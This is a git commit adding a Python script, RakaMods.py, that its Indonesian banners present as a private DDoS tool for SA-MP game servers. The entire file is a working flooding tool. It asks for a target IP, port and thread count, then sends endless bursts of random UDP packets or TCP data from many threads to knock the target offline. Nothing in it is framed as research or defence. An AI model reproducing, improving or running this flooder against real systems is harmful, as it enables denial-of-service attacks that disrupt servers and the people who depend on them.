5b27d50a8e300a4fc48b26c0ec00cdf5a151a9a2
KangDDOS <85217226+KangDDOS@users.noreply.github.com>
2021-06-02 14:05:06 +0700

    Add files via upload

---
+++ RakaMods.py
@@ -0,0 +1,49 @@
+#!/usr/bin/env python3
+#code Raka
+import random
+import socket
+import threading
+
+print("         RakaMods.DDoS     ")
+print("          VIP SC PRIVATE          ")
+print("DDOS SERPER SAMP BY RAKA")
+ip = str(input(" Target ip:"))
+port = int(input(" Target Port:"))
+choice = str(input(" UDP BIAR NGRY(y/n):"))
+times = int(input(" Serangan yang mau di kirim:"))
+threads = int(input(" Threads yang dikirim"))
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Nante Nanges Sent!!!")
+		except:
+			print("[!] Error!!!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[*]","[!]","[#]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Sent!!!")
+		except:
+			s.close()
+			print("[*] Error")
+            
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
